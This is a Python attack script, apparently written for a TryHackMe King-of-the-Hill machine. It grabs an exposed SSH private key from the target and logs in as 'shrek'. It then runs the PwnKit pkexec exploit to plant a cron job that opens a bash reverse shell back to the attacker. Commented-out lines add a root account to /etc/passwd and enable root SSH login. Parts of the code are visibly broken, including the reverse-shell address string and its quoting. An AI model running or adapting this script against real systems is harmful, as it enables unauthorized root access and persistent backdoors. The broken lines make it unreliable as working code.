import os
import shutil
import paramiko
import netifaces
import subprocess

def main():
    #scripts by gatekeep security
    #reference https://github.com/holmes-py/King-of-the-hill#machine-name-food
    
    local_ip = netifaces.ifaddresses('tun0')[netifaces.AF_INET][0]['addr']
    print("Your local IP is: " + local_ip)

    #tryHackMeUsername = input("Please enter your tryhackme username: ")
    #print ("Your Tryhackme username is: ")

    remote_host = input("Please enter remote (target) IP: ")
    print ("The target IP is: " + remote_host)

    remote_host = remote_host.strip()
    #grab the ssh key, 
    grabSSHKey = "wget " + remote_host + "/Cpxtpt2hWCee9VFa.txt"
    os.system(grabSSHKey)

    #setup a web server
    process = subprocess.Popen(["python", "-m", "http.server", "8080"])

    #grab pkexec exploit
    os.system("curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit && git clone https://github.com/redsquirrel7/KingMe.git")
    shutil.make_archive('KingMe', 'zip', 'KingMe')

    #set up private key, and load it into paramiko
    shutil.copyfile("./Cpxtpt2hWCee9VFa.txt", "./id.rsa")
    os.system("chmod 600 id.rsa")

    #set up parameters for SSH
    username = 'shrek'
    key_path = 'id.rsa'
    private_key = paramiko.RSAKey.from_private_key_file(key_path)

    #create an SSH client
    client = paramiko.SSHClient()

    #automatically add the server's host key
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    #connect to the server using the private key
    client.connect(hostname=remote_host, username=username, pkey=private_key)   

    #grab pwnkit from the local_ip, and make it executable
    stdin, stdout, stderr = client.exec_command('wget '+ local_ip + ':8080/PwnKit')

    stdin, stdout, stderr = client.exec_command('chmod +x PwnKit')

    persistenceOneLiner = "crontab -l > mycron && echo \"* * * * * bash -i >& /dev/tcp/"+local_ip+"10.0.0.1/8080 0>&1\" >> mycron && crontab mycron && rm mycron"
    stdin, stdout, stderr = client.exec_command("./PwnKit '+persistenceOneLiner\"'")
    
    #run a new ls to see if the wget worked
    #stdin, stdout, stderr = client.exec_command("./PwnKit 'echo \"servicehost:\$1\$Wu14739E\$yfKROtkwv6MeZHZ7FQO1s.:0:0:root:/root:/bin/bash\" >> /etc/passwd'")

    #run a new ls to see if the wget worked
    #stdin, stdout, stderr = client.exec_command("./PwnKit \"sed -i 's/PermitRootLogin no/PermitRootLogin yes/g' /etc/ssh/sshd_config && service ssh restart\"")

    #close ssh connection
    client.close()

    #clean slate, remove existing files
    os.remove("id.rsa")
    os.remove("Cpxtpt2hWCee9VFa.txt")
    os.remove("PwnKit")
    os.remove("KingMe.zip")
    shutil.rmtree("./KingMe")
    os.system("kill " + str(process.pid))

main()